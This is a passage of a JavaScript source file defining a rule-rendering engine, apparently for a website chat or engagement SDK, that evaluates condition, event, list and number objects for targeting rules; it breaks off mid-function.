/* Timestamp: Wed Nov 01 22:27:13 PDT 2023 , Code Version: 1698902819879 */
var RENDERINGCONTEXT = {};
var JSSDK_RENDERER = function () {
  var jssdk_renderer = {};
  var addToJssdkRenderer = function (func_name, func) {
    jssdk_renderer[func_name] = func;
  };
  var RenderAbstractCondition = function (conditionObj, rule, evt, extraArgs) {
    if (typeof conditionObj === "boolean") {
      return conditionObj;
    }
    if (conditionObj.type == "And") {
      return RenderAnd(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "Or") {
      return RenderOr(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "Not") {
      return RenderNot(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "DateListTest") {
      return RenderDateListTest(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "ListTest") {
      return RenderListTest(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "NumberCompare") {
      return RenderNumberCompare(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "NumberRangeCompare") {
      return RenderNumberRangeCompare(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "IsCurrentBrowserVersion") {
      return RenderIsCurrentBrowserVersion(conditionObj);
    } else if (conditionObj.type == "StringCompare") {
      return RenderStringCompare(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "Exists") {
      return RenderExists(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "VariableRefType") {
      return RenderVariableRefType(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "DateCompare") {
      return RenderDateCompare(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "ContentGroupCheck") {
      return RenderContentGroupCheck(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "ContentGroupCheck2") {
      return RenderContentGroupCheck2(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "UrlMatch") {
      return RenderUrlMatch(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "PageIdCheck") {
      return RenderPageIdCheck(conditionObj);
    } else if (conditionObj.type == "MarkerCheck") {
      return RenderMarkerCheck(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "IsServiceInProgress") {
      return RenderIsServiceInProgress(conditionObj);
    } else if (conditionObj.type == "IsConversationActive") {
      return RenderIsConversationActive(conditionObj);
    } else if (conditionObj.type == "IsServiceBlocked") {
      return RenderIsServiceBlocked(conditionObj);
    } else if (conditionObj.type == "ClickToPersistentActive") {
      return RenderClickToPersistentActive(conditionObj);
    } else if (conditionObj.type == "IsPersistentWindow") {
      return RenderIsPersistentWindow(conditionObj);
    } else if (conditionObj.type == "ConstantRef") {
      return RenderConstantRef(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "AsBoolean") {
      return RenderAsBoolean(conditionObj, rule, evt, extraArgs);
    } else if (conditionObj.type == "VisitorAttributeBannedTest") {
      return RenderVisitorAttributeBannedTest(conditionObj);
    } else if (conditionObj.type == "IsBrowser") {
      return RenderIsBrowser(conditionObj);
    } else if (conditionObj.type == "IsScheduleMet") {
      return RenderIsScheduleMet(conditionObj);
    } else if (conditionObj.type == "IsDeviceType") {
      return RenderIsDeviceType(conditionObj);
    } else if (conditionObj.type == "IsOperatingSystem") {
      return RenderIsOperatingSystem(conditionObj);
    } else if (conditionObj.type == "CurrentAgentAttributeTest") {
      return RenderCurrentAgentAttributeTest(conditionObj);
    }
    throw "RenderAbstractCondition: Unexpected condition type: " + conditionObj.type;
  };
  addToJssdkRenderer('RenderAbstractCondition', RenderAbstractCondition);
  var RenderAnd = function (obj, rule, evt, extraArgs) {
    var tmpResult = true;
    for (var idx = 0; idx < obj.value.length; idx++) {
      tmpResult = tmpResult && RenderAbstractCondition(obj.value[idx], rule, evt, extraArgs);
    }
    return tmpResult;
  };
  addToJssdkRenderer('RenderAnd', RenderAnd);
  var RenderAsBoolean = function (numberObj, rule, evt, extraArgs) {
    return new Boolean(RenderAbstractItem(numberObj.value, rule, evt, extraArgs)).valueOf();
  };
  addToJssdkRenderer('RenderAsBoolean', RenderAsBoolean);
  var RenderClickToPersistentActive = function (obj) {
    return RENDERINGCONTEXT.isC2PActive(obj.value);
  };
  addToJssdkRenderer('RenderClickToPersistentActive', RenderClickToPersistentActive);
  var RenderContentGroupCheck = function (obj, rule, evt, extraArgs) {
    if ("landingOrder" in obj) {
      return RENDERINGCONTEXT.LDM.checkCG(RenderAbstractString(obj.cgId, rule, evt, extraArgs), RenderAbstractNumber(obj.landingOrder, rule, evt, extraArgs));
    }
    return RENDERINGCONTEXT.LDM.checkCG(RenderAbstractString(obj.cgId, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderContentGroupCheck', RenderContentGroupCheck);
  var RenderContentGroupCheck2 = function (obj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.LDM.checkCG(RenderAbstractString(obj.cgId, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderContentGroupCheck2', RenderContentGroupCheck2);
  var RenderCurrentAgentAttributeTest = function (obj) {
    return RENDERINGCONTEXT.CHM.getChatData() ? RENDERINGCONTEXT.CHM.getChatData().testAgentAttributesValue(obj.name, obj.value) : false;
  };
  addToJssdkRenderer('RenderCurrentAgentAttributeTest', RenderCurrentAgentAttributeTest);
  var RenderDateCompare = function (obj, rule, evt, extraArgs) {
    var date1 = RenderAbstractDate(obj.date1, rule, evt, extraArgs);
    var date2 = RenderAbstractDate(obj.date2, rule, evt, extraArgs);
    return date1[obj.op](date2);
  };
  addToJssdkRenderer('RenderDateCompare', RenderDateCompare);
  var RenderDateListTest = function (obj, rule, evt, extraArgs) {
    var result = {};
    result.dateList = RenderAbstractList(obj.dateList, rule, evt, extraArgs);
    result.date = RenderAbstractDate(obj.date, rule, evt, extraArgs);
    return result.dateList["test"](obj.date);
  };
  addToJssdkRenderer('RenderDateListTest', RenderDateListTest);
  var RenderExists = function (obj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.e9(function () {
      if ("item" in obj) {
        return RenderAbstractItem(obj.item, rule, evt, extraArgs);
      }
      if ("list" in obj) {
        return RenderAbstractList(obj.list, rule, evt, extraArgs);
      }
    }, obj.defaultValOnError, obj.logOnEvaluationError);
  };
  addToJssdkRenderer('RenderExists', RenderExists);
  var RenderIsBrowser = function (obj) {
    return obj.browserType == RENDERINGCONTEXT.getClientBrowserType();
  };
  addToJssdkRenderer('RenderIsBrowser', RenderIsBrowser);
  var RenderIsDeviceType = function (obj) {
    return RENDERINGCONTEXT.d8t(RenderAbstractString(obj.value));
  };
  addToJssdkRenderer('RenderIsDeviceType', RenderIsDeviceType);
  var RenderIsConversationActive = function (obj) {
    return RENDERINGCONTEXT.getConversationActive();
  };
  addToJssdkRenderer('RenderIsConversationActive', RenderIsConversationActive);
  var RenderIsOperatingSystem = function (obj) {
    return obj.value == RENDERINGCONTEXT.getOSType();
  };
  addToJssdkRenderer('RenderIsOperatingSystem', RenderIsOperatingSystem);
  var RenderIsPersistentWindow = function (obj) {
    return RENDERINGCONTEXT.CHM.isPersistentWindow();
  };
  addToJssdkRenderer('RenderIsPersistentWindow', RenderIsPersistentWindow);
  var RenderIsScheduleMet = function (obj) {
    return RENDERINGCONTEXT.isSchMet(RenderAbstractString(obj.scheduleId));
  };
  addToJssdkRenderer('RenderIsScheduleMet', RenderIsScheduleMet);
  var RenderIsServiceBlocked = function (obj) {
    return RENDERINGCONTEXT.isServiceBlocked(RenderAbstractString(obj.value));
  };
  addToJssdkRenderer('RenderIsServiceBlocked', RenderIsServiceBlocked);
  var RenderIsServiceInProgress = function (obj) {
    return RENDERINGCONTEXT.CHM.isServiceInProgress(RenderAbstractString(obj.svcProgressType));
  };
  addToJssdkRenderer('RenderIsServiceInProgress', RenderIsServiceInProgress);
  var RenderContainsAll = function (obj, array, rule, evt, extraArgs) {
    return array.containsAll(RenderAbstractList(obj.value, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderContainsAll', RenderContainsAll);
  var RenderContains = function (obj, array, rule, evt, extraArgs) {
    return array.contains(RenderAbstractItem(obj.value, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderContains', RenderContains);
  var RenderIsEmpty = function (obj, array) {
    return array.isEmpty();
  };
  addToJssdkRenderer('RenderIsEmpty', RenderIsEmpty);
  var RenderListTest = function (obj, rule, evt, extraArgs) {
    var list = RenderAbstractList(obj.value, rule, evt, extraArgs);
    var test = obj.test;
    if (test.type == "Empty") {
      return RenderIsEmpty(test, list, rule, evt, extraArgs);
    } else if (test.type == "Contains") {
      return RenderContains(test, list, rule, evt, extraArgs);
    } else if (test.type == "ContainsAll") {
      return RenderContainsAll(test, list, rule, evt, extraArgs);
    }
    throw "RenderListTest: Unexpected test type: " + test.type;
  };
  addToJssdkRenderer('RenderListTest', RenderListTest);
  var RenderMarkerCheck = function (obj, rule, evt, extraArgs) {
    if (evt == undefined) {
      throw "RenderMarkerCheck error: evt is undefined!";
    }
    var pageMarker = RENDERINGCONTEXT.LDM.getPageMarker(null, evt);
    return pageMarker ? RenderStringCompareOp(pageMarker, obj["string-compare"], rule, evt, extraArgs) : false;
  };
  addToJssdkRenderer('RenderMarkerCheck', RenderMarkerCheck);
  var RenderNot = function (obj, rule, evt, extraArgs) {
    return !RenderAbstractCondition(obj.value, rule, evt, extraArgs);
  };
  addToJssdkRenderer('RenderNot', RenderNot);
  var RenderNumberCompare = function (obj, rule, evt, extraArgs) {
    var num1 = RenderAbstractNumber(obj.num1, rule, evt, extraArgs);
    var num2 = RenderAbstractNumber(obj.num2, rule, evt, extraArgs);
    if (obj.op == "==") {
      return num1 == num2;
    } else if (obj.op == ">") {
      return num1 > num2;
    } else if (obj.op == ">=") {
      return num1 >= num2;
    } else if (obj.op == "<") {
      return num1 < num2;
    } else if (obj.op == "<=") {
      return num1 <= num2;
    }
    throw "RenderNumberCompare: Unexpected op type: " + obj.op;
  };
  addToJssdkRenderer('RenderNumberCompare', RenderNumberCompare);
  var RenderNumberRangeCompare = function (obj, rule, evt, extraArgs) {
    return RenderAbstractNumber(obj.num, rule, evt, extraArgs).inRange(RenderAbstractNumber(obj.low, rule, evt, extraArgs), RenderAbstractNumber(obj.high, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderNumberRangeCompare', RenderNumberRangeCompare);
  var RenderOr = function (obj, rule, evt, extraArgs) {
    var tmpResult = false;
    for (var i = 0; i < obj.value.length; i++) {
      var item = obj.value[i];
      tmpResult = tmpResult || RenderAbstractCondition(item, rule, evt, extraArgs);
    }
    return tmpResult;
  };
  addToJssdkRenderer('RenderOr', RenderOr);
  var RenderPageIdCheck = function (obj) {
    return RENDERINGCONTEXT.LDM.pageCheck(RenderAbstractNumber(obj.pageIdCheck));
  };
  addToJssdkRenderer('RenderPageIdCheck', RenderPageIdCheck);
  var RenderReContains = function (obj, str, rule, evt, extraArgs) {
    var result = str.search(RenderAbstractString(obj.search_string, rule, evt, extraArgs)) != -1;
    return result;
  };
  addToJssdkRenderer('RenderReContains', RenderReContains);
  var RenderReEndsWith = function (obj, str) {
    var result = str.search(RenderAbstractString(obj.search_string)) != -1;
    return result;
  };
  addToJssdkRenderer('RenderReEndsWith', RenderReEndsWith);
  var RenderReEquals = function (obj, str) {
    var result = str == RenderAbstractString(obj.str) ? true : false;
    return result;
  };
  addToJssdkRenderer('RenderReEquals', RenderReEquals);
  var RenderReStartsWith = function (obj, str) {
    var result = str.search(RenderAbstractString(obj.search_string)) != -1;
    return result;
  };
  addToJssdkRenderer('RenderReStartsWith', RenderReStartsWith);
  var RenderRegexp = function (obj, str) {
    var result = str.match(RenderAbstractString(obj.str)) == null ? false : true;
    return result;
  };
  addToJssdkRenderer('RenderRegexp', RenderRegexp);
  var RenderStringCompareOp = function (string1, obj, rule, evt) {
    var regexp = false;
    if ("regexp" in obj) regexp = obj.regexp;
    if (typeof string1 !== "string") {
      return false;
    } else if (obj.op == "equals") {
      return string1.equals(RenderAbstractString(obj.content, rule, evt), obj["ignore-case"], regexp);
    } else if (obj.op == "startsWith") {
      return string1.startsWith(RenderAbstractString(obj.content, rule, evt), obj["ignore-case"], regexp);
    } else if (obj.op == "endsWith") {
      return string1.endsWith(RenderAbstractString(obj.content, rule, evt), obj["ignore-case"], regexp);
    } else if (obj.op == "contains") {
      return string1.contains(RenderAbstractString(obj.content, rule, evt), obj["ignore-case"], regexp);
    }
    throw "RenderStringCompareOp: unknown string compare operation: " + obj.op;
  };
  addToJssdkRenderer('RenderStringCompareOp', RenderStringCompareOp);
  var RenderStringCompare = function (obj, rule, evt, extraArgs) {
    return RenderStringCompareOp(RenderAbstractString(obj.string, rule, evt, extraArgs), obj["string-compare"], rule, evt);
  };
  addToJssdkRenderer('RenderStringCompare', RenderStringCompare);
  var RenderUrlMatch = function (obj, rule, evt, extraArgs) {
    var url;
    if (v3Lander.isWebSDK) {
      url = window.pageUrl;
    } else {
      url = RENDERINGCONTEXT.win.document.URL;
    }
    return url && url.match(RenderAbstractString(obj.regexp, rule, evt, extraArgs)) != null ? true : false;
  };
  addToJssdkRenderer('RenderUrlMatch', RenderUrlMatch);
  var RenderIsCurrentBrowserVersion = function (obj) {
    var compareVersion = RENDERINGCONTEXT.compareVersions(RENDERINGCONTEXT.cbtv1(), obj.version);
    if (obj.op == "EE") {
      return compareVersion == 0;
    } else if (obj.op == "GT") {
      return compareVersion > 0;
    } else if (obj.op == "GE") {
      return compareVersion >= 0;
    } else if (obj.op == "LE") {
      return compareVersion <= 0;
    } else if (obj.op == "LT") {
      return compareVersion < 0;
    }
    throw "RenderIsCurrentBrowserVersion: Unexpected op type: " + obj.op;
  };
  addToJssdkRenderer('RenderIsCurrentBrowserVersion', RenderIsCurrentBrowserVersion);
  var RenderVisitorAttributeBannedTest = function (obj) {
    var functionName = obj.functionName;
    return RENDERINGCONTEXT.VAM.functionName(RenderVisitorAttribute(obj.visitorAttribute));
  };
  addToJssdkRenderer('RenderVisitorAttributeBannedTest', RenderVisitorAttributeBannedTest);
  var RenderConstantRef = function (numberObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.gc7(RenderAbstractString(numberObj.cName, rule, evt, extraArgs), rule);
  };
  addToJssdkRenderer('RenderConstantRef', RenderConstantRef);
  var RenderAbstractConstants = function (constantObj, rule, evt) {
    var returnObj = {};
    for (var prop in constantObj) {
      if (constantObj[prop] && constantObj[prop].value instanceof Array) {
        returnObj[prop] = RenderAbstractList(constantObj[prop], rule, evt);
      } else {
        returnObj[prop] = RenderAbstractItem(constantObj[prop], rule, evt);
      }
    }
    return returnObj;
  };
  addToJssdkRenderer('RenderAbstractConstants', RenderAbstractConstants);
  var RenderAbstractDate = function (dateObj, rule, evt, extraArgs) {
    if (dateObj.type == "XMLGregorianCalendar") {
      return RenderDate(dateObj);
    } else if (dateObj.type == "DateOffset") {
      return RenderDateOffset(dateObj, rule, evt, extraArgs);
    } else if (dateObj.type == "VariableRefType") {
      return RenderVariableRefType(dateObj, rule, evt, extraArgs);
    } else if (dateObj.type == "JsVarType") {
      return RenderJsVarType(dateObj);
    } else if (dateObj.type == "abstract-item") {
      return RenderAbstractItemObj(dateObj, rule, evt, extraArgs);
    } else if (dateObj.type == "DateNow") {
      return RenderDateNow(dateObj);
    } else if (dateObj.type == "ConstantRef") {
      return RenderConstantRef(dateObj, rule, evt, extraArgs);
    }
    throw "RenderAbstractDate: Unexpected date type: " + dateObj.type;
  };
  addToJssdkRenderer('RenderAbstractDate', RenderAbstractDate);
  var RenderDateOffset = function (dateObj, rule, evt) {
    var test = null;
    if ("offset" in dateObj) {
      var offset_date;
      if (dateObj['offset_date'].type == "VariableRefType") {
        offset_date = RenderVariableRefType(dateObj['offset_date'], rule, evt);
      } else if (dateObj['offset_date'].type == "JsVarType") {
        offset_date = RenderJsVarType(dateObj['offset_date']);
      } else {
        throw "RenderDateOffset error: Unknown type for date offset.";
      }
      return new RENDERINGCONTEXT.Date(offset_date).roll(RenderAbstractNumber(dateObj.offset, rule, evt));
    }
    return test;
  };
  addToJssdkRenderer('RenderDateOffset', RenderDateOffset);
  var RenderDate = function (dateObj) {
    return new RENDERINGCONTEXT.Date(RenderAbstractNumber(dateObj.value));
  };
  addToJssdkRenderer('RenderDate', RenderDate);
  var RenderDateNow = function (dateObj) {
    return new RENDERINGCONTEXT.Date();
  };
  addToJssdkRenderer('RenderDateNow', RenderDateNow);
  var RenderAbstractEvent = function (eventObj, rule, evt) {
    if (eventObj.type == "custom-event") {
      return RenderCustomEvent(eventObj, rule, evt);
    } else if (eventObj.type == "dom-event") {
      return RenderDomEvent(eventObj, rule, evt);
    } else if (eventObj.type == "service-event") {
      return RenderServiceEvent(eventObj, rule, evt);
    } else if (eventObj.type == "event") {
      return RenderEvent(eventObj, rule, evt);
    }
    throw "RenderAbstractEvent: Unexpected event type: " + stringObj.value;
  };
  addToJssdkRenderer('RenderAbstractEvent', RenderAbstractEvent);
  var RenderCustomEvent = function (obj, rule, evt) {
    var eventObj = obj.event;
    var returnObj = {};
    returnObj.id = "on" + RenderAbstractString(eventObj.id, rule, evt);
    if ("delayInMS" in eventObj) {
      returnObj.delayInMS = RenderAbstractNumber(eventObj.delayInMS, rule, evt);
      returnObj.onlyInFocus = eventObj.onlyInFocus;
    }
    return returnObj;
  };
  addToJssdkRenderer('RenderCustomEvent', RenderCustomEvent);
  var RenderDomElements = function (arrayObj) {
    var returnObj = [];
    for (var idx = 0; idx < arrayObj.length; idx++) {
      var renderred;
      if (arrayObj[idx].type == "dom-event-abstract-fcn") {
        renderred = RenderDomEventAbstractFcn(arrayObj[idx]);
      } else if (arrayObj[idx].type == "dom-event-tag-name") {
        renderred = RenderDomEventTagName(arrayObj[idx]);
      } else if (arrayObj[idx].type == "dom-event-element-name") {
        renderred = RenderDomEventElementName(arrayObj[idx]);
      } else if (arrayObj[idx].type == "dom-event-class-name") {
        renderred = RenderDomEventClassName(arrayObj[idx]);
      } else if (arrayObj[idx].type == "dom-event-element-id") {
        renderred = RenderDomEventElementId(arrayObj[idx]);
      }
      returnObj.push(renderred);
    }
    return returnObj;
  };
  addToJssdkRenderer('RenderDomElements', RenderDomElements);
  var RenderDomElementsForWebSDK = function (arrayObj) {
    var returnObj = [];
    for (var idx = 0; idx < arrayObj.length; idx++) {
      var renderred;
      if (arrayObj[idx].type == "dom-event-abstract-fcn") {
        renderred = {
          "funcName": RenderDomEventAbstractFcnForWebSDK(arrayObj[idx])
        };
      } else if (arrayObj[idx].type == "dom-event-tag-name") {
        renderred = {
          "tagName": arrayObj[idx].str
        };
      } else if (arrayObj[idx].type == "dom-event-element-name") {
        renderred = {
          "elementName": arrayObj[idx].str
        };
      } else if (arrayObj[idx].type == "dom-event-class-name") {
        renderred = {
          "className": arrayObj[idx].str
        };
      } else if (arrayObj[idx].type == "dom-event-element-id") {
        renderred = {
          "elementId": arrayObj[idx].value
        };
      }
      returnObj.push(renderred);
    }
    return returnObj;
  };
  addToJssdkRenderer('RenderDomElementsForWebSDK', RenderDomElementsForWebSDK);
  var RenderDomEventAbstractFcn = function (obj) {
    var returnDetails = true;
    var funcResult = RenderAbstractFunction(obj.fcn, returnDetails);
    var func = funcResult.func;
    var funcName = funcResult.name;
    return RENDERINGCONTEXT.FM.callExternalHelperSafe(funcName);
  };
  addToJssdkRenderer('RenderDomEventAbstractFcn', RenderDomEventAbstractFcn);
  var RenderDomEventAbstractFcnForWebSDK = function (obj) {
    var funcResult = RenderAbstractFunction(obj.fcn, true);
    return funcResult.actualName;
  };
  addToJssdkRenderer('RenderDomEventAbstractFcnForWebSDK', RenderDomEventAbstractFcnForWebSDK);
  var RenderDomEventClassName = function (obj) {
    return RENDERINGCONTEXT.doc.getElementsByClassName(RenderAbstractString(obj.str));
  };
  addToJssdkRenderer('RenderDomEventClassName', RenderDomEventClassName);
  var RenderDomEventElementId = function (obj) {
    if ("iframeID" in obj) {
      return [RENDERINGCONTEXT.doc.getElementById(obj.iframeID).contentWindow.document.getElementById(obj.value)];
    } else {
      return [RENDERINGCONTEXT.doc.getElementById(RenderAbstractString(obj.value))];
    }
  };
  addToJssdkRenderer('RenderDomEventElementId', RenderDomEventElementId);
  var RenderDomEventElementName = function (obj) {
    return RENDERINGCONTEXT.doc.getElementsByName(RenderAbstractString(obj.str));
  };
  addToJssdkRenderer('RenderDomEventElementName', RenderDomEventElementName);
  var RenderDomEventTagName = function (obj) {
    return RENDERINGCONTEXT.doc.getElementsByTagName(RenderAbstractString(obj.str));
  };
  addToJssdkRenderer('RenderDomEventTagName', RenderDomEventTagName);
  var RenderDomEvent = function (obj, rule, evt) {
    var eventObj = obj.event;
    var returnObj = {};
    returnObj.id = RenderAbstractString(eventObj.id, rule, evt);
    if ("domElementId" in eventObj) returnObj.domElementId = RenderAbstractString(eventObj.domElementId, rule, evt);
    if ("delayInMS" in eventObj) returnObj.delayInMS = RenderAbstractNumber(eventObj.delayInMS, rule, evt);
    if ("onlyInFocus" in eventObj) returnObj.onlyInFocus = eventObj.onlyInFocus;
    if ("hoverTime" in eventObj) returnObj.hoverTime = RenderAbstractNumber(eventObj.hoverTime, rule, evt);
    if ("domElements" in eventObj) returnObj.domElements = v3Lander.isWebSDK ? RenderDomElementsForWebSDK(eventObj.domElements) : RenderDomElements(eventObj.domElements);
    return returnObj;
  };
  addToJssdkRenderer('RenderDomEvent', RenderDomEvent);
  var RenderEvent = function (obj, rule, evt) {
    var eventObj = obj.event;
    var returnObj = {};
    returnObj.id = RenderAbstractString(eventObj.id, rule, evt);
    if ("delayInMS" in eventObj) {
      returnObj.delayInMS = RenderAbstractNumber(eventObj.delayInMS, rule, evt);
      returnObj.onlyInFocus = eventObj.onlyInFocus;
    }
    return returnObj;
  };
  addToJssdkRenderer('RenderEvent', RenderEvent);
  var RenderServiceEvent = function (obj, rule, evt) {
    var eventObj = obj.event;
    var returnObj = {};
    returnObj.id = RenderAbstractString(eventObj.id, rule, evt);
    returnObj.serviceType = RenderAbstractString(eventObj.serviceType, rule, evt);
    if ("delayInMS" in eventObj) {
      returnObj.delayInMS = RenderAbstractNumber(eventObj.delayInMS, rule, evt);
      returnObj.onlyInFocus = eventObj.onlyInFocus;
    }
    return returnObj;
  };
  addToJssdkRenderer('RenderServiceEvent', RenderServiceEvent);
  var RenderAbstractList = function (listObj, rule, evt, extraArgs) {
    if (listObj.type == "JsVarType") {
      return RenderJsVarType(listObj);
    } else if (listObj.type == "abstract-list-item") {
      return RenderAbstractListItem(listObj, rule, evt, extraArgs);
    } else if (listObj.type == "VariableRefType") {
      return RenderVariableRefType(listObj, rule, evt, extraArgs);
    } else if (listObj.type == "ConstantRef") {
      return RenderConstantRef(listObj, rule, evt, extraArgs);
    } else if (listObj.type == "MapKeys") {
      return RenderMapKeys(listObj, rule, evt, extraArgs);
    } else if (listObj.type == "MapValues") {
      return RenderMapValues(listObj, rule, evt, extraArgs);
    } else if (listObj.type == "MapIteratorType") {
      return RenderMapIteratorType(listObj, rule, evt, extraArgs);
    } else if (listObj.type == "BlockedServices") {
      return RenderBlockServices(listObj);
    }
    throw "RenderAbstractList: Unexpected list type: " + listObj.type;
  };
  addToJssdkRenderer('RenderAbstractList', RenderAbstractList);
  var RenderAbstractListItem = function (listObj, rule, evt, extraArgs) {
    var returnObj = [];
    for (var idx = 0; idx < listObj.value.length; idx++) {
      returnObj.push(RenderAbstractItem(listObj.value[idx], rule, evt, extraArgs));
    }
    return returnObj;
  };
  addToJssdkRenderer('RenderAbstractListItem', RenderAbstractListItem);
  var RenderBlockServices = function (blockObj) {
    return RENDERINGCONTEXT.getBlockedServicesList();
  };
  addToJssdkRenderer('RenderBlockServices', RenderBlockServices);
  var RenderDateList = function (listObj) {
    return listObj.value;
  };
  addToJssdkRenderer('RenderDateList', RenderDateList);
  var RenderMapIteratorType = function (mapObj, rule, evt, extraArgs) {
    var resultMap = RenderAbstractMap(mapObj.mapName, rule, evt, extraArgs);
    if (!resultMap) {
      return null;
    }
    if (mapObj.fncName) {
      return resultMap.collect(RenderAbstractFunction(mapObj.fncName, false));
    }
    return resultMap.collect();
  };
  addToJssdkRenderer('RenderMapIteratorType', RenderMapIteratorType);
  var RenderMapKeys = function (mapObj, rule, evt, extraArgs) {
    var reslutMap = RenderAbstractMap(mapObj.value, rule, evt, extraArgs);
    return reslutMap == null ? null : reslutMap.keys();
  };
  addToJssdkRenderer('RenderMapKeys', RenderMapKeys);
  var RenderAbstractMap = function (mapObj, rule, evt, extraArgs) {
    if (mapObj.type == "CurrentVisitorAttributes") {
      return RenderCurrentVisitorAttributes(mapObj, rule, evt, extraArgs);
    } else if (mapObj.type == "VariableRefType") {
      return RenderVariableRefType(mapObj, rule, evt, extraArgs);
    }
    throw "RenderAbstractMap: Unexpected map type: " + mapObj.type;
  };
  addToJssdkRenderer('RenderAbstractMap', RenderAbstractMap);
  var RenderMapValues = function (mapObj, rule, evt, extraArgs) {
    var resultMap = RenderAbstractMap(mapObj.value, rule, evt, extraArgs);
    return resultMap == null ? null : resultMap.values();
  };
  addToJssdkRenderer('RenderMapValues', RenderMapValues);
  var RenderNumberList = function (listObj) {
    return listObj.value;
  };
  addToJssdkRenderer('RenderNumberList', RenderNumberList);
  var RenderStringList = function (listObj) {
    var retArr = [];
    for (var i = 0; i < listObj.value.length; i++) {
      retArr[i] = RenderAbstractString(listObj.value[i]);
    }
    return retArr;
  };
  addToJssdkRenderer('RenderStringList', RenderStringList);
  var RenderAbstractNumber = function (numberObj, rule, evt, extraArgs) {
    if (typeof numberObj === "number") {
      return numberObj;
    }
    if (numberObj.type == "abstract-item") {
      return RenderAbstractItemObj(numberObj, rule, evt, extraArgs);
    } else if (numberObj.type == "BusinessUnitId") {
      return RenderBusinessUnitId(numberObj, rule, evt);
    } else if (numberObj.type == "AgentGroupId") {
      return RenderAgentGroupId(numberObj, evt);
    } else if (numberObj.type == "SiteId") {
      return RenderSiteId(numberObj);
    } else if (numberObj.type == "CurrentPageId") {
      return RenderCurrentPageId(numberObj, evt);
    } else if (numberObj.type == "BusinessRuleId") {
      return RenderBusinessRuleId(numberObj, rule, evt);
    } else if (numberObj.type == "DefaultAgentGroupId") {
      return RenderDefaultAgentGroupId(numberObj);
    } else if (numberObj.type == "PageId") {
      return RenderPageID(numberObj, evt);
    } else if (numberObj.type == "DateDiff") {
      return RenderDateDiff(numberObj, rule, evt);
    } else if (numberObj.type == "SaleExpiration") {
      return RenderSaleExpiration(numberObj);
    } else if (numberObj.type == "RechatInterval") {
      return RenderRechatInterval(numberObj);
    } else if (numberObj.type == "ArithmeticOperation") {
      return RenderArithmeticOperation(numberObj, rule, evt, extraArgs);
    } else if (numberObj.type == "Duration") {
      return RenderDuration(numberObj);
    } else if (numberObj.type == "JsVarRef") {
      return RenderJsRefType(numberObj);
    } else if (numberObj.type == "JsVarType") {
      return RenderJsVarType(numberObj);
    } else if (numberObj.type == "ListSize") {
      return RenderListSize(numberObj);
    } else if (numberObj.type == "MathPI") {
      return Math.PI;
    } else if (numberObj.type == "MathOp") {
      return RenderMathOP(numberObj);
    } else if (numberObj.type == "LandingCount") {
      return RenderLandingCount(numberObj);
    } else if (numberObj.type == "RandomNumber") {
      return RenderRandomNumber(numberObj);
    } else if (numberObj.type == "Null") {
      return NaN;
    } else if (numberObj.type == "RandomInt") {
      return RenderRandomInt(numberObj);
    } else if (numberObj.type == "ConstantRef") {
      return RenderConstantRef(numberObj, rule, evt, extraArgs);
    } else if (numberObj.type == "number-group") {
      return RenderNumberGroup(numberObj);
    } else if (numberObj.type == "VariableRefType") {
      return RenderVariableRefType(numberObj, rule, evt, extraArgs);
    }
    throw "RenderAbstractNumber: Unexpected number type: " + numberObj.type;
  };
  addToJssdkRenderer('RenderAbstractNumber', RenderAbstractNumber);
  var RenderAgentGroupId = function (numberObj, evt) {
    return RENDERINGCONTEXT.CHM.getAgentGroupID(evt, numberObj.agentAssignedStage);
  };
  addToJssdkRenderer('RenderAgentGroupId', RenderAgentGroupId);
  var RenderArithmeticOperation = function (numberObj, rule, evt, extraArgs) {
    var op = numberObj['op'];
    var result;
    for (var idx = 0; idx < numberObj.numbers.length; idx++) {
      var num = RenderAbstractNumber(numberObj.numbers[idx], rule, evt, extraArgs);
      if (idx == 0) {
        result = num;
        continue;
      }
      if (op == '+') {
        result += num;
      } else if (op == '-') {
        result -= num;
      } else if (op == '*') {
        result = result * num;
      } else if (op == '/') {
        result = result / num;
      } else {
        throw "RenderArithmeticOperation: Unexpected op type: " + op;
      }
    }
    return result;
  };
  addToJssdkRenderer('RenderArithmeticOperation', RenderArithmeticOperation);
  var RenderBusinessRuleId = function (numberObj, rule, evt) {
    if (RENDERINGCONTEXT.CHM.getChat()) {
      return RENDERINGCONTEXT.CHM.getChat().getRuleId();
    }
    if (evt && evt.rule) {
      return evt.rule.id;
    }
    if (rule == undefined || rule == null) {
      throw "RenderBusinessRuleId error: rule is undefined or null.";
    }
    return rule.getID();
  };
  addToJssdkRenderer('RenderBusinessRuleId', RenderBusinessRuleId);
  var RenderBusinessUnitId = function (numberObj, rule, evt) {
    return RENDERINGCONTEXT.CHM.getBusinessUnitID(evt, rule);
  };
  addToJssdkRenderer('RenderBusinessUnitId', RenderBusinessUnitId);
  var RenderCurrentPageId = function (numberObject, evt) {
    if (evt == undefined) {
      throw "RenderCurrentPageId error: evt is undefined.";
    }
    return RENDERINGCONTEXT.LDM.getPageID(null, evt);
  };
  addToJssdkRenderer('RenderCurrentPageId', RenderCurrentPageId);
  var RenderDateDiff = function (dateObj, rule, evt) {
    if ("date1" in dateObj) {
      var inNum = parseFloat(RenderAbstractString(dateObj.inStr, rule, evt));
